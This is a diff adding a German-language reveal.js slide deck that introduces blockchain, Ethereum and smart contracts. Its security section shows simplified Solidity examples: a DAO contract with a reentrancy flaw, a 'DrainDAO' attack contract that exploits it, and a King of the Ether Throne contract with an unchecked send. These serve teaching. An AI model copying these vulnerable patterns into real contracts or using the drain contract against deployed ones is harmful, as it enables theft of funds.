@@ -1,0 +1,281 @@
+<html>
+  <head>
+    <link rel="stylesheet" href="vendor/css/reveal.css">
+    <link rel="stylesheet" href="vendor/css/theme/white.css">
+  </head>
+  <body>
+    <div class="reveal">
+      <div class="slides">
+
+        <section>
+          <img src="images/blocklab_logo.svg" style="border: 0;"/>
+        </section>
+
+        <section data-markdown>
+          <script type="text/template">
+            ## Agenda
+
+            * Blockchain und Ethereum
+            * Smart Contracts
+              * Anwendungen
+              * Entwicklung
+              * Verwendung
+              * Sicherheit
+          </script>
+        </section>
+
+        <section data-markdown>
+          <script type="text/template">
+            ## Blockchain
+
+            * append-only public ledger (Unveränderlichkeit)
+            * maintained by nodes of a peer-to-peer network (Dezentral)
+          </script>
+        </section>
+
+        <section data-markdown>
+          <script type="text/template">
+            ## Bitcoin
+
+            * decentralized cryptographic currency
+            * avoids double spend
+          </script>
+        </section>
+
+        <section data-markdown>
+          <script type="text/template">
+            ## Smart Contract
+
+            > "a set of __promises__, specified in __digital form__, including __protocols__ within which the parties perform on these promises." - Nick Szabo
+          </script>
+        </section>
+
+        <section data-markdown>
+          <script type="text/template">
+            ## Alternative Definition
+
+            > "automatically enforced agreements"
+          </script>
+        </section>
+
+        <section data-markdown>
+          <script type="text/template">
+            ## Ethereum
+
+            > "decentralized platform that runs smart contracts: applications that run exactly as programmed without any possibility of downtime, censorship, fraud or third party interference."
+          </script>
+        </section>
+
+        <section data-markdown>
+          <script type="text/template">
+            ## Umsetzung
+
+            * Smart Contract als Computerprogramm
+            * Endlosschleife verhindern durch Gas
+          </script>
+        </section>
+
+        <section data-markdown>
+          <script type="text/template">
+            ## Gas
+
+            * Ether Preis entkoppeln vom Preis einer Operation
+            * Anreiz für Miner die Transaktion zu erfassen
+          </script>
+          <aside class="notes">
+            Annahme Privatechain in der einem die Miner selbst gehoeren. Entsprechend wird Ether nicht benoetigt.
+          </aside>
+        </section>
+
+        <section>
+          <table>
+            <tr>
+              <th></th>
+              <th>Bitcoin</th>
+              <th>Ethereum</th>
+            </tr>
+            <tr>
+              <td>Einführung</td>
+              <td>2009</td>
+              <td>2015</td>
+            </tr>
+            <tr>
+              <td>Wert einer Einheit</td>
+              <td>~650 EUR</td>
+              <td>~10 EUR</td>
+            </tr>
+            <tr>
+              <td>Marktkapitalisierung</td>
+              <td>10 Mrd.</td>
+              <td>1 Mrd.</td>
+            </tr>
+            <tr>
+              <td>Block Reward</td>
+              <td>12.5 BTC</td>
+              <td>5 ETH</td>
+            </tr>
+            <tr>
+              <td>Blocksize</td>
+              <td>1 MB</td>
+              <td>Miner entscheiden (Gaslimit)</td>
+            </tr>
+            <tr>
+              <td>Blocktime</td>
+              <td>10 Min.</td>
+              <td>15 Sek.</td>
+            </tr>
+          </table>
+        </section>
+
+        <section data-markdown>
+          <script type="text/template">
+            ## Werkzeuge
+
+            * [TestRPC](https://github.com/ethereumjs/testrpc)
+            * [Truffle](https://github.com/ConsenSys/truffle)
+            * [web3](https://github.com/ethereum/web3.js/)
+            * [MetaMask](https://metamask.io/)
+            * [Mist](https://github.com/ethereum/mist)
+          </script>
+        </section>
+
+        <section>
+          Hands-on
+        </section>
+
+        <section data-markdown>
+          <script type="text/template">
+            ## Beispiele
+
+            * [The DAO](https://github.com/slockit/DAO/blob/master/DAO.sol)
+            * [Augur](https://github.com/AugurProject/augur-core/blob/develop/src/data_api/events.se)
+          </script>
+        </section>
+
+        <section data-markdown>
+          <script type="text/template">
+            ### Reentrancy - DAO Hack (~$60M Schaden)
+
+            ```
+            contract DAO {
+              mapping (address => uint) public balances
+
+              function invest(address to) {
+                balances[to] += msg.value;
+              }
+
+              function withdraw(uint amount) {
+                if (balances[msg.sender] >= amount) {
+                  msg.sender.send(amount);
+                  balances[msg.sender]-=amount;
+                }
+              }
+            }
+            ```
+          </script>
+        </section>
+
+        <section data-markdown>
+          <script type="text/template">
+            ### Angriffs Contract
+
+            ```
+            contract DrainDAO {
+              DAO public dao = DAO(0x5d1d6327539dd92afe...);
+              function DrainDAO() {
+                owner = msg.sender;
+              }
+
+              function() {
+                dao.withdraw(1000);
+              }
+
+              function payout() {
+                owner.send(this.balance);
+              }
+            }
+            ```
+          </script>
+        </section>
+
+        <section data-markdown>
+          <script type="text/template">
+            ### King of the Ether Throne
+
+            ```
+            contract KotET {
+              address public king;
+              uint public claimPrice = 100;
+              address owner;
+
+              function KotET() {
+                owner = msg.sender;
+                king = msg.sender;
+              }
+
+              function() {
+                if (msg.value < claimPrice) throw;
+                king.send(compensation);
+                king = msg.sender;
+                claimPrice = msg.value;
+              }
+            }
+            ```
+
+            [Quelle: A survey of attacks on Ethereum smart contracts S.14](https://eprint.iacr.org/2016/1007)
+          </script>
+        </section>
+
+        <section data-markdown>
+          <script type="text/template">
+            ### Herausforderungen
+
+            * Riesiger Angriffsvektor
+            * Zukunft (Hardforks, Umstieg auf Proof of Stake)
+          </script>
+          <aside class="notes">
+            Unterschied zwischen Banküberweisung tätigen und Handelsgesellschaft aufsetzen
+          </aside>
+        </section>
+
+        <section data-markdown>
+          <script type="text/template">
+            Weitere Informationen:
+
+            ## Grundlagen
+            [Coursera - Cryptography I - Stanford University](https://www.coursera.org/learn/crypto)
+
+            ## Sicherheit
+            [A survey of attacks on Ethereum smart contracts](https://eprint.iacr.org/2016/1007)
+
+            ## Kritik
+            [Why I’m short Ethereum](https://medium.com/@tuurdemeester/why-im-short-ethereum-and-long-bitcoin-aee5b1c198fd) - Auch die Querverweise im Artikel lesen
+          </script>
+        </section>
+
+        <section>
+          <img src="images/blocklab_logo.svg" style="border: 0;"/>
+
+          Vielen Dank!
+        </section>
+      </div>
+    </div>
+    <script src="vendor/lib/js/head.min.js"></script>
+    <script src="vendor/js/reveal.js"></script>
+    <script>
+      Reveal.initialize({
+        dependencies: [
+          // Interpret Markdown in <section> elements
+          { src: 'vendor/plugin/markdown/marked.js', condition: function() { return !!document.querySelector( '[data-markdown]' ); } },
+          { src: 'vendor/plugin/markdown/markdown.js', condition: function() { return !!document.querySelector( '[data-markdown]' ); } },
+
+          // Syntax highlight for <code> elements
+          { src: 'vendor/plugin/highlight/highlight.js', async: true, callback: function() { hljs.initHighlightingOnLoad(); } },
+
+          // Speaker notes
+          { src: 'vendor/plugin/notes/notes.js', async: true }
+        ]
+      });
+    </script>
+  </body>
+</html>
